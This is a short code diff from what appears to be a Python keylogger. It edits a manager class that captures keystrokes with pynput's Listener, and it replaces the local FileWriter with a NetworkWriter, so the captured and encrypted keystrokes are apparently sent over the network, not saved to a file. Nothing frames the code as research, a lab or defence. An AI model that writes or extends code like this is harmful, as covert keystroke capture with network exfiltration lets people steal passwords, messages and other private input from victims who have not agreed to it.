@@ -1,4 +1,4 @@
-from service import KeyLoggerService, FileWriter, Encryptor
+from service import KeyLoggerService, FileWriter, Encryptor,NetworkWriter
 from Interface import IKeyLoggerManager
 from pynput.keyboard import Listener
 import threading, time
@@ -8,7 +8,7 @@ class KeyLoggerManager(IKeyLoggerManager):
     def __init__(self, serial_number: int):
         self.__serial_number = serial_number
         self.__key_logger = KeyLoggerService()
-        self.__writer = FileWriter()
+        self.__writer = NetworkWriter()
         self.__encryptor = Encryptor()
         self.__is_logging = False
         self.__logger_thread = threading.Thread(target=self.__listen)
